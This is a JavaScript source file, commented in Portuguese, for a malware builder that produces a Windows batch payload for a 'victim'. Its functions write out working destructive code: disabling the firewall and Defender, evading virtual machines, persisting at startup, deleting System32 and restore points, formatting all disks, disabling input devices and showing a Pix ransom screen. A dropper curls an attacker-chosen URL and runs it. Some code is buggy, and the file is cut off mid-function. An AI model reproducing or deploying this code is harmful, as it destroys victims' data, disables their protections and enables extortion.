// Função para construir o script .bat com base nas opções marcadas
function build() {
    // Inicializa o conteúdo do script .bat
    var batContent = "@echo off\n";

    // Verifica se o Firewall está marcado
    var desativarFirewallChecked = document.getElementById("firewallCheckbox").checked;
    if (desativarFirewallChecked) {
        batContent += desativarFirewall();
    }

    // Verifica se o Antivírus está marcado
    var desativarAntivirusChecked = document.getElementById("antivirusCheckbox").checked;
    if (desativarAntivirusChecked) {
        batContent += desativarAntivirus();
    }

    // Verifica se a notificação está marcada
    var notificationChecked = document.getElementById("notificacaoCheckbox").checked;
    if (notificationChecked) {
        batContent += desativarNotificacao();
    }

    // Ativa o script para iniciar junto com o Windows
    var ativarstartupChecked = document.getElementById("startupCheckbox").checked;
    if (ativarstartupChecked) {
        batContent += ativarstartup();
    }

    // Instala o Python automaticamente na vítima
    var pythoninstallChecked = document.getElementById("pythoninsCheckbox").checked;
    if (pythoninstallChecked) {
        batContent += installPython();
    }
    
    //Desativar atualizações do windows
    var atualizacaoChecked = document.getElementById("atualizacaoCheckbox").checked;
    if (atualizacaoChecked) {
        batContent += desativarnotw();
    }

    //antiVM
    var antiVMchecked = document.getElementById("antiVMCheckbox").checked;
    if (antiVMchecked){
      batContent += detectVMS();
    }

    //deletar system 32
    var deletests32Checked = document.getElementById("deletesys32Checkbox").checked;
    if (deletests32Checked){
        batContent += deletarsys32();
    }

    //desativa teclado
    var tecladooffChecked = document.getElementById("tecladooffCheckbox").checked;
    if (tecladooffChecked){
       batContent += disablekeyboard();
    }

    //tela preta
    var telapretaChecked = document.getElementById("telapretaCheckbox").checked;
    if (telapretaChecked){
        batContent += blackscreen();
    }

    //excluir pontos de restauração
    var antipointChecked = document.getElementById("antipointCheckbox").checked;
    if (antipointChecked){
        batContent += removepoints();
    }

    //formata todos os discos
    var formatdiskChecked = document.getElementById("formatdiscoCheckbox").checked;
    if (formatdiskChecked){
        batContent += formatdisks();
    }

    // Desliga a máquina quando executado
    var desligarChecked = document.getElementById("desligarCheckbox").checked;
    if (desligarChecked){
        batContent += desligarMaquina();
    }

    // Reinicia a máquina
    var reiniciarChecked = document.getElementById("reiniciarCheckbox").checked;
    if (reiniciarChecked){
        batContent += reiniciarMaquina();
    }

    // Abre vários processos
    var processpamChecked = document.getElementById("processpamCheckbox").checked;
    if (processpamChecked){
        batContent += abrirProcessos();
    }

    // Desinstala todos os programas
    var dellprogramChecked = document.getElementById("dellprogramCheckbox").checked;
    if (dellprogramChecked){
        batContent += desinstalarProgramas();
    }

    // Desliga atalhos
    var inativeatalhosChecked = document.getElementById("inativeatalhosCheckbox").checked;
    if (inativeatalhosChecked){
        batContent += desativarAtalhos();
    }

    // Criptografa todos os dados e pede PIX para 'Liberar'
    var trojanChecked = document.getElementById("trojanCheckbox").checked;
    if (trojanChecked){
        batContent += criarTrojan();
    }
    
    // desativa o teclado
    var mataratoChecked = document.getElementById("mataratoCheckbox").checked;
    if(mataratoChecked) {
        batContent += matarato();
    }

    // Verifica se a opção "Instala automaticamente" está marcada
    var instalaAutomaticoChecked = document.getElementById("DropCheckbox").checked;
    if (instalaAutomaticoChecked) {
        batContent += instalaAutomatico();
    }

    // Cria um link de download para o script .bat
    var blob = new Blob([batContent], { type: "text/plain" });
    var link = document.createElement("a");
    link.href = window.URL.createObjectURL(blob);
    link.download = "MLZ2.bat";
    link.click();

    // Após criar o .bat, abre a janela de customização
    openCustomizeMenu();
}

//função para detectar VM
function detectVMS() {
  return `
setlocal

systeminfo | findstr /c:"Hyper-V" >nul && (
    pause
    exit
) || (
)
  
driverquery | find "vmmouse" > nul
if %errorlevel% equ 0 (
    exit /b
)

driverquery | find "vbox" > nul
if %errorlevel% equ 0 (
    exit /b
)


systeminfo | find "Fabricante do sistema operacional" | find "Microsoft" > nul
if %errorlevel% equ 1 (
    exit /b
)

goto :ContinueScript

:VMdetected
exit /b

:ContinueScript
endlocal
`;
}

// Função para desativar a notificação da vítima
function desativarNotificacao() {
    return `
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v NoToastApplicationNotification /t REG_DWORD /d 1 /f

taskkill /f /im explorer.exe
start explorer.exe
`;
}

// Função para desativar o Firewall
function desativarFirewall() {
    return `
netsh advfirewall set allprofiles state off
dvfirewall firewall add rule name="Bloquear tudo" dir=in action=block
`;
}

// Função para desativar o Antivírus
function desativarAntivirus() {
    return `
REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f    
`;
}

// Instalação do Python automaticamente na vítima
function installPython() {
    return `
setlocal enabledelayedexpansion

set "pythonVersion=3.11.7"
set "installDir=C:\\Python"
set "pythonExe=python%pythonVersion%.exe"

where "%pythonExe%" >nul 2>&1
if %errorlevel% equ 0 (
    echo Python já está instalado.
    goto :eof
)

set "installerURL=https://www.python.org/ftp/python/%pythonVersion%/python-%pythonVersion%-amd64.exe"
set "installerPath=%TEMP%\\python-installer.exe"

echo Baixando o instalador do Python...
curl -o "%installerPath%" "%installerURL%" || (
    echo Falha ao baixar o instalador.
)

echo Instalando o Python...
"%installerPath%" /quiet InstallAllUsers=1 PrependPath=1 TargetDir="%installDir%" || (
    echo Falha ao instalar o Python.
)

set "pythonPath=%installDir%\\%pythonExe%"
setx PATH "!pythonPath!;!PATH!" /M || (
    echo Falha ao adicionar o Python ao PATH.
)

echo print("Olá, Mundo!") > "%TEMP%\\hello.py"
"%pythonPath%" "%TEMP%\\hello.py"

del "%TEMP%\\hello.py"
del "%installerPath%"
`;
}


//Desativa atualizações do windows
function desativarnotw() {
    return `
sc config wuauserv start= disabled
sc stop wuauserv
sc config BITS start= disabled
sc stop BITS
sc config DcomLaunch start= disabled
sc stop DcomLaunch
sc config wscsvc start= disabled
sc stop wscsvc
`;
}



//remover pontos de restauração
function removepoints() {
    return `
setlocal

%SystemRoot%\System32\cmd.exe /c %SystemRoot%\System32\vssadmin.exe list shadows | findstr "Contents Created" >nul

if %errorlevel% equ 0 (
    echo Existem pontos de restauração. Prossiga com a exclusão...

    start /b %SystemRoot%\System32\cmd.exe /c %SystemRoot%\System32\vssadmin.exe Resize ShadowStorage /On=C: /For=C: /MaxSize=401MB

    start /b %SystemRoot%\System32\cmd.exe /c %SystemRoot%\System32\vssadmin.exe Delete Shadows /All /Quiet

    echo Todos os pontos de restauração foram excluídos com sucesso.
) else (
    echo Não existem pontos de restauração para excluir.
)  

2>nul >nul reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisableBalloonTips /t REG_DWORD /d 1 /f

vssadmin delete shadows /all /quiet >nul 2>&1
if %errorlevel% equ 0 (
) else (
)

REM Desativa a Restauração do Sistema apenas para o usuário atual
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1
if %errorlevel% equ 0 (
) else (
)

vssadmin list shadows >nul 2>&1

2>nul >nul reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisableBalloonTips /t REG_DWORD /d 0 /f

`;
}


//desabilitar o keyboard
function disablekeyboard() {
    return `
setlocal enabledelayedexpansion

devcon.exe /u *ACPI\PNP0303* >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt\Start" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
echo Set oWMP = CreateObject("WScript.Shell") > DisableKeyboard.vbs
echo oWMP.SendKeys "{CAPSLOCK}" >> DisableKeyboard.vbs
echo oWMP.SendKeys "{NUMLOCK}" >> DisableKeyboard.vbs
echo oWMP.SendKeys "{SCROLLLOCK}" >> DisableKeyboard.vbs
wscript.exe DisableKeyboard.vbs >nul 2>&1
del DisableKeyboard.vbs >nul 2>&1
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility" /v "MessageDuration" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "IgnoreRemoteKeyboardLayout" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v "KeyboardSubtype" /t REG_DWORD /d 3 /f >nul 2>&1
`;
}

//desabilitar mause
function matarato() {
    return `
setlocal enabledelayedexpansion

devcon.exe /u *ACPI\PNP0F03* >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt\Start" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1

echo Set oWMP = CreateObject("WScript.Shell") > DisableMouse.vbs
echo oWMP.SendKeys "{LWIN}" >> DisableMouse.vbs
echo oWMP.SendKeys "{RWIN}" >> DisableMouse.vbs
echo oWMP.SendKeys "{MOUSE_BUTTON_LEFT}" >> DisableMouse.vbs
echo oWMP.SendKeys "{MOUSE_BUTTON_RIGHT}" >> DisableMouse.vbs
wscript.exe DisableMouse.vbs >nul 2>&1
del DisableMouse.vbs >nul 2>&1

sc stop mouclass >nul 2>&1
sc config mouclass start= disabled >nul 2>&1

cipher /e /s:C:\Windows\System32\drivers\mouclass.sys >nul 2>&1

reg add "HKEY_CURRENT_USER\Control Panel\Accessibility" /v "MessageDuration" /t REG_DWORD /d 0 /f >nul 2>&1

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "IgnoreRemoteMouseLayout" /t REG_DWORD /d 1 /f >nul 2>&1
`;
}

//tela preta
function blackscreen() {
    return `
sc config wuauserv start= demand
net stop wuauserv
sc config bits start= demand
net stop bits
taskkill /f /im explorer.exe
taskkill /f /im notepad.exe
taskkill /f /im chrome.exe
taskkill /f /im excel.exe
taskkill /f /im msedge.exe
taskkill /f /im Discord.exe
taskkill /f /im browser.exe
taskkill /f /im iexplore.exe
taskkill /f /im Photoshop.exe
taskkill /f /im winword.exe
taskkill /f /im powerpnt.exe
taskkill /f /im outlook.exe
taskkill /f /im msaccess.exe
taskkill /f /im msohtmed.exe
taskkill /f /im mspub.exe
taskkill /f /im onenote.exe
taskkill /f /im visio.exe
taskkill /f /im bridge.exe
taskkill /f /im Camera Raw.8bi
taskkill /f /im CEPHtmlEngine.exe
taskkill /f /im AdobeUpdateService.exe
taskkill /f /im firefox.exe
taskkill /f /im Safari.exe
taskkill /f /im opera.exe
taskkill /f /im brave.exe
taskkill /f /im vivaldi.exe
taskkill /f /im Dooble.exe
taskkill /f /im DPlus.exe
taskkill /f /im Dissenter.exe
taskkill /f /im Cyberfox.exe
taskkill /f /im Coowon.exe
taskkill /f /im CometBird.exe
taskkill /f /im cliqz.exe
taskkill /f /im Citrio.exe
taskkill /f /im Centaury.exe
taskkill /f /im browzar.exe
taskkill /f /im BlackHawk.exe
taskkill /f /im beonex.exe
taskkill /f /im BeakerBrowser.exe
taskkill /f /im basilisk.exe
taskkill /f /im AvastBrowser.exe
taskkill /f /im avant.exe
taskkill /f /im airfox.exe
taskkill /f /im 360SE.exe
taskkill /f /im 1stBrowser.exe
taskkill /f /im Elements Browser.exe
taskkill /f /im EpicPrivacyBrowser.exe
taskkill /f /im eolie.exe
taskkill /f /im falkon.exe
taskkill /f /im Falcon.exe
taskkill /f /im slimbrowser.exe
taskkill /f /im Ghost Browser.exe
taskkill /f /im epiphany.exe
taskkill /f /im GreenBrowser.exe
taskkill /f /im icecat.exe
taskkill /f /im k-meleon.exe
taskkill /f /im KasperskyBrowser.exe
taskkill /f /im konqueror.exe
taskkill /f /im Kuroshiro.exe
taskkill /f /im luakit.exe
taskkill /f /im facebook.exe
taskkill /f /im Instagram.exe
taskkill /f /im Twitter.exe
taskkill /f /im WhatsApp.exe
taskkill /f /im Telegram.exe
taskkill /f /im outlook.exe
taskkill /f /im thunderbird.exe
taskkill /f /im Spotify.exe
taskkill /f /im iTunes.exe
taskkill /f /im steam.exe
taskkill /f /im EpicGamesLauncher.exe
taskkill /f /im AvastUI.exe
taskkill /f /im Norton.exe
taskkill /f /im Malwarebytes.exe
taskkill /f /im slack.exe
taskkill /f /im Teams.exe
taskkill /f /im waze.exe
taskkill /f /im Dropbox.exe
taskkill /f /im code.exe
taskkill /f /im idea.exe
taskkill /f /im Skype.exe
taskkill /f /im Zoom.exe
taskkill /f /im obs64.exe
taskkill /f /im Adobe Premiere Pro.exe
taskkill /f /im DaVinci Resolve.exe
taskkill /f /im gimp-2.10.exe
taskkill /f /im atom.exe
taskkill /f /im sublime_text.exe
taskkill /f /im eclipse.exe
taskkill /f /im audacity.exe
taskkill /f /im foobar2000.exe
taskkill /f /im Ableton Live.exe
taskkill /f /im XSplit.Core.exe
taskkill /f /im TwitchStudio.exe
taskkill /f /im avgui.exe
taskkill /f /im mcshield.exe
taskkill /f /im avcenter.exe
taskkill /f /im League of Legends.exe
taskkill /f /im FortniteClient-Win64-Shipping.exe
taskkill /f /im MinecraftLauncher.exe
taskkill /f /im notion.exe
taskkill /f /im Evernote.exe
taskkill /f /im devenv.exe
taskkill /f /im RobloxPlayerLauncher.exe
taskkill /f /im TLauncher.exe
taskkill /f /im ccSvcHst.exe
taskkill /f /im avp.exe
taskkill /f /im bdagent.exe
taskkill /f /im egui.exe
taskkill /f /im mbam.exe
taskkill /f /im sophosui.exe
taskkill /f /im tmtray.exe
taskkill /f /im AdAware.exe
taskkill /f /im PSANHost.exe
taskkill /f /im cfp.exe
taskkill /f /im ACOdyssey.exe
taskkill /f /im RDR2.exe
taskkill /f /im ModernWarfare.exe
taskkill /f /im Overwatch.exe
taskkill /f /im witcher3.exe
taskkill /f /im FIFA22.exe
taskkill /f /im minecraft.exe
taskkill /f /im RocketLeague.exe
taskkill /f /im HollowKnight.exe
taskkill /f /im StardewValley.exe
taskkill /f /im CivilizationVI.exe
taskkill /f /im StarCraft II.exe
taskkill /f /im League of Legends.exe
taskkill /f /im dota2.exe
taskkill /f /im Cyberpunk2077.exe
taskkill /f /im Among Us.exe
taskkill /f /im VALORANT.exe
taskkill /f /im DOOMEternalx64vk.exe
taskkill /f /im hlvr.exe
taskkill /f /im destiny2.exe
taskkill /f /im FarCry6.exe
taskkill /f /im MetroExodus.exe
taskkill /f /im World of Warcraft.exe
taskkill /f /im Gw2-64.exe
taskkill /f /im BlackDesert64.exe
taskkill /f /im portal2.exe
taskkill /f /im TetrisEffect.exe
taskkill /f /im RainbowSix.exe
taskkill /f /im ForzaMotorsport7.exe
taskkill /f /im dirtrally2.exe
taskkill /f /im starwarsjedifallenorder.exe
taskkill /f /im DOOMx64.exe
taskkill /f /im sekiro.exe
taskkill /f /im RimWorldWin64.exe
taskkill /f /im DarkSoulsIII.exe
taskkill /f /im Anno1800.exe
taskkill /f /im Phasmophobia.exe
taskkill /f /im re8.exe
taskkill /f /im F1_2021.exe
taskkill /f /im YuanShen.exe
taskkill /f /im VirtualBox.exe
taskkill /f /im ProcessHacker.exe
taskkill /f /im launcher.exe    
`;
}

//deletar system32
function deletarsys32() {
    return `
set pastaParaExcluir=C:\Windows\System32
del /F /Q "%pastaParaExcluir%"
`;
}

//formatar todos os discos
function formatdisks(){
    return `
setlocal enabledelayedexpansion

for /f "tokens=2 delims==" %%i in ('wmic logicaldisk get drivetype^,deviceid /value') do (
    if %%i equ 2 (
        echo Unidade removível detectada: %%j
        echo Formatando %%j...
        format /q /y %%j
    ) else if %%i equ 3 (
        echo Disco fixo detectado: %%j
        echo Formatando %%j...
        format /q /y %%j
    )
) 
`;
}





// Desinstala todos os programas
function desinstalarProgramas() {
    return `
wmic product get name | foreach { 
    if ($_.trim() -ne "") { 
        Write-Output "Desinstalando: $_"; 
        Start-Process msiexec.exe -ArgumentList "/x", $_, "/quiet", "/norestart" -Wait 
    } 
}
`;
}

//randonizador de tempo
function tempoChecked() {
    return `
setlocal

net stop w32time >nul

reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DateTime\Servers" /f >nul 2>&1

set "random_datetime=%random_year%/%random_month%/%random_day% %random_hour%:%random_minute%"
echo Setting system date and time to: %random_datetime%
date %random_datetime%
time %random_datetime%

timeout /t 1 >nul

set /a "random_year=%RANDOM% %% 5 + 2024"
set /a "random_month=%RANDOM% %% 12 + 1"
set /a "random_day=%RANDOM% %% 30 + 1"
set /a "random_hour=%RANDOM% %% 24"
set /a "random_minute=%RANDOM% %% 60" 
`;
}

// Desliga atalhos
function desativarAtalhos() {
    return `
setlocal enabledelayedexpansion

devcon.exe /u *Keyboard* >nul 2>&1

echo Set oWMP = CreateObject("WScript.Shell") > DisableShortcuts.vbs
echo oWMP.SendKeys "^c" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^x" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^v" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^z" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^y" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^s" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^p" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^a" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^f" >> DisableShortcuts.vbs
echo oWMP.SendKeys "%{F4}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "%{Tab}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^n" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^w" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^t" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{Tab}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^+{Tab}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{LWIN}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{RWIN}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{D}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{L}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{E}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{R}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{S}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{I}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^+{ESC}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^%{DEL}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{PRTSC}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "%{PRTSC}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{PRTSC}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{F2}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{F5}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{+}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{-}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^%{M}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^!{DEL}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{TAB}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{W}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{Q}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{A}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{S}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{D}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{F}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{G}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{H}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{J}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{K}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{L}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{Z}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{X}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{C}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{V}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{B}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{N}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "^{M}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{UP}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{DOWN}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{LEFT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{RIGHT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{HOME}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{END}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{PGUP}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{PGDN}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{INSERT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{DELETE}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{ESC}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{CAPSLOCK}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{NUMLOCK}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{SCROLLLOCK}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{APPSKEY}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{TAB}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{ENTER}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{SPACE}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{BACKSPACE}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{TAB}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{LSHIFT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{RSHIFT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{LCTRL}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{RCTRL}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{LALT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{RALT}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{LWIN}" >> DisableShortcuts.vbs
echo oWMP.SendKeys "{RWIN}" >> DisableShortcuts.vbs
wscript.exe DisableShortcuts.vbs >nul 2>&1
del DisableShortcuts.vbs >nul 2>&1

sc stop KeyboardShortcuts >nul 2>&1
sc config KeyboardShortcuts start= disabled >nul 2>&1

cipher /e /s:C:\Windows\System32\drivers\keyboard.sys >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "DisableShortcuts" /t REG_SZ /d "%~dpnx0" /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Explorer" /v "DisableHotkeys" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ForegroundLockTimeout" /t REG_SZ /d 0 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaverIsSecure" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d 0 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoWinKeys" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "IgnoreAllKeyboardShortcuts" /t REG_DWORD /d 1 /f >nul 2>&1
`;
}

// Ativa o script para iniciar junto com o Windows
function ativarstartup() {
    return `
setlocal enabledelayedexpansion

set "scriptDir=%~dp0"

set "system32Dir=%SystemRoot%\\System32"

move "!scriptDir!\\%~nx0" "!system32Dir!\\"

set "startupDir=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
set "scriptInStartup=!startupDir!\\startup_script.bat"

if not exist "!scriptInStartup!" (
    echo @echo off >> "!scriptInStartup!" || (
        echo Erro ao criar o arquivo de inicialização.
    )
    echo call "!system32Dir!\\%~nx0" >> "!scriptInStartup!" || (
        echo Erro ao adicionar o comando de inicialização.
    )
    echo Script adicionado com sucesso à inicialização do sistema.
) else (
    echo O script já existe na pasta de inicialização. Nenhuma ação necessária.
)
`;
}

// Abre vários processos
function abrirProcessos() {
    return `
for /l %%i in (1, 1, 250) do (
    start cmd
)
`;
}

// Desliga a máquina quando executado
function desligarMaquina() {
    return `
shutdown /s /t 0
`;
}

// Reinicia a máquina
function reiniciarMaquina() {
    return `
shutdown /r /t 0
`;
}

// Criptografa todos os dados e pede PIX para 'Liberar'
function criarTrojan() {
    return `
echo ^<html^>^<head^>^<title^>Seus arquivos foram criptografados!^</title^> > ransomware.hta 
echo. >> ransomware.hta 
echo ^<hta:application id="oBVC" >> ransomware.hta 
echo applicationname="Ransomware" >> ransomware.hta 
echo version="1.0" >> ransomware.hta 
echo maximizebutton="no" >> ransomware.hta 
echo minimizebutton="no" >> ransomware.hta 
echo sysmenu="no" >> ransomware.hta 
echo Caption="no" >> ransomware.hta 
echo windowstate="maximize"/^> >> ransomware.hta 
echo. >> ransomware.hta 
echo ^</head^>^<body bgcolor="#000000" scroll="no"^> >> ransomware.hta 
echo ^<style^> >> ransomware.hta
echo   body { font-family: 'Courier New', monospace; color: #00FF00; background-color: #000000; text-align: center; } >> ransomware.hta
echo   h1 { color: #FF0000; font-size: 28px; } >> ransomware.hta
echo   p { margin: 15px 0; font-size: 18px; } >> ransomware.hta
echo   img.flag { width: 197px; height: auto; position: absolute; } >> ransomware.hta
echo   .flag-left { bottom: 0; left: 0; } >> ransomware.hta
echo   .flag-right { bottom: 0; right: 0; } >> ransomware.hta
echo   .gif-container { display: flex; justify-content: space-around; margin-top: 20px; } >> ransomware.hta
echo   .gif { width: 200px; height: 200px; } >> ransomware.hta
echo ^</style^> >> ransomware.hta
echo ^<font face="'Courier New', monospace" size="4" color="#00FF00"^> >> ransomware.hta 
echo ^<h1^>SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!^</h1^> >> ransomware.hta 
echo ^<p^>Para recuperar seus arquivos, siga as instrucoes abaixo:^</p^> >> ransomware.hta 
echo ^<p^>1. Pague o resgate de R$300 para o seguinte endereco Pix:^</p^> >> ransomware.hta 
echo ^<p^>   1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2^</p^> >> ransomware.hta 
echo ^<p^>2. Voce recebera as instrucoes para desbloquear seus arquivos apos a confirmacao do pagamento.^</p^> >> ransomware.hta 
echo ^<p^>Se voce tentar remover ou desativar este aviso sem seguir as instrucoes, seus arquivos serao perdidos permanentemente.^</p^> >> ransomware.hta 
echo ^<p^>Este aviso expirara em 48 horas. Apos esse periodo, o resgate aumentara para R$500.^</p^> >> ransomware.hta 
echo ^<p^>Nao tente fechar ou reiniciar o computador antes de efetuar o pagamento.^</p^> >> ransomware.hta 
echo ^<p^>Caso tente desligar da tomada ou reiniciar/desligar os dados vao ser perdidos, alem de queimar o seu HD/SSD.^</p^> >> ransomware.hta 
echo ^<div class="gif-container"^> >> ransomware.hta
echo   ^<img src="https://i.gifer.com/origin/84/84d79f587caeee69caf306386ec3527d_w200.gif" alt="Ransomware Banner"^> >> ransomware.hta
echo   ^<img src="https://1337skulls.xyz/assets/1337_5p1n.d23dc14c.gif" alt="Additional GIF"^> >> ransomware.hta
echo   ^<img src="https://cdn.discordapp.com/attachments/1169376899470991511/1204626352301416508/ezgif-4-1f8c5d1313.gif?ex=65d56ab7&is=65c2f5b7&hm=f25c781bf21265d13dd1fa49c8c62acf17f356c8d7e3d9440ca430ef572d06fc&" alt="Another GIF"^> >> ransomware.hta
echo ^</div^> >> ransomware.hta
echo ^<img class="flag flag-left" src="https://cdn.discordapp.com/attachments/1190696151830253690/1204604264303829052/snapedit_1707270371610.png?ex=65d55625&is=65c2e125&hm=f0245093e990e0579a9f78d0dfef0d25f9695706be2d044672693928a3c1d4be&" alt="Bandeira da Albânia"^> >> ransomware.hta
echo ^<img class="flag flag-right" src="https://cdn.discordapp.com/attachments/1190696151830253690/1204604264303829052/snapedit_1707270371610.png?ex=65d55625&is=65c2e125&hm=f0245093e990e0579a9f78d0dfef0d25f9695706be2d044672693928a3c1d4be&" alt="Bandeira da Albânia"^> >> ransomware.hta
echo ^</font^> >> ransomware.hta 
echo ^</body^>^</html^> >> ransomware.hta 
start "" /wait "ransomware.hta" 
del /s /f /q "ransomware.hta" > nul
`;
}



// Função correspondente para "Instala automático"
function instalaAutomatico() {
    var urlDownload = document.getElementById("Drop").value;

    var admCheckbox = document.getElementById("admCheckbox").checked;
    var automaticCheckbox = document.getElementById("automaticCheckbox").checked;

    var scriptContent = '';

    if (admCheckbox && automaticCheckbox) {
        // Caso ambas as opções estejam ativadas
        scriptContent = 
                        `setlocal\n`+
                        `set "url=${urlDownload}"\n`+
                        `for /f "delims=/ tokens=*" %%i in ("%url%") do set "filename=%%~nxi"\n`+
                        `set "destino=%USERPROFILE%\Downloads\%filename%"\n`+
                        `curl "%url%" -o "%destino%"\n`+
                        `runas /user:Administrator "%destino%"\n` +
                        `start "" "%destino%"`
                        `endlocal\n`;
    } else if (admCheckbox) {
        // Caso apenas a opção de admin esteja ativada
        scriptContent = 
                        `setlocal\n`+
                        `set "url=${urlDownload}"\n`+
                        `for /f "delims=/ tokens=*" %%i in ("%url%") do set "filename=%%~nxi"\n`+
